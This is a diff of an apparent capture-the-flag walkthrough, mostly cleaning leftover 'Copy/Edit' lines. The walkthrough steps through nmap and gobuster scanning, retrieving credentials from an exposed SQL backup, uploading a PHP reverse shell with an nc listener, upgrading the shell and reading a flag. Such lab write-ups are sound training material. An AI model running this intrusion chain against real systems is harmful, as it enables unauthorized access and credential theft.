@@ -8,8 +8,7 @@ Goal: Discover open services and web directories.
 
 ✅ Nmap Scan
 bash
-Copy
-Edit
+
 nmap -A -T4 <TARGET_IP>
 Found:
 
@@ -19,16 +18,14 @@ Port 80 – HTTP
 
 ✅ Directory Brute Forcing with Gobuster
 bash
-Copy
-Edit
+
 gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt
 Discovered /content directory
 
 Then:
 
 bash
-Copy
-Edit
+
 gobuster dir -u http://<TARGET_IP>/content -w /usr/share/wordlists/dirb/common.txt
 Found:
 
@@ -43,8 +40,7 @@ Goal: Extract credentials from accessible resources.
 Visit in browser or download using:
 
 bash
-Copy
-Edit
+
 wget http://<TARGET_IP>/content/inc/mysql_backup.sql
 Inside the .sql file, found:
 
@@ -70,21 +66,18 @@ Use the recovered credentials
 Use php-reverse-shell.php from Pentestmonkey:
 
 bash
-Copy
-Edit
+
 cp /usr/share/webshells/php/php-reverse-shell.php .
 Edit the file:
 
 php
-Copy
-Edit
+
 $ip = 'YOUR_LOCAL_IP';  // tun0 or eth0 IP
 $port = 4444;
 Upload via the admin panel
 
 ✅ Set Up Listener
-bash
-Copy
+
 Edit
 nc -lvnp 4444
 ✅ Trigger Shell
@@ -98,20 +91,17 @@ Goal: Explore the system and capture flags.
 
 ✅ Upgrade Shell (optional)
 bash
-Copy
-Edit
+
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 Then:
 
 bash
-Copy
-Edit
+
 Ctrl + Z
 stty raw -echo; fg
 export TERM=xterm
 ✅ Capture the Flag
-bash
-Copy
+
 Edit
 cat /home/<user>/user.txt
 ✅ Summary Table
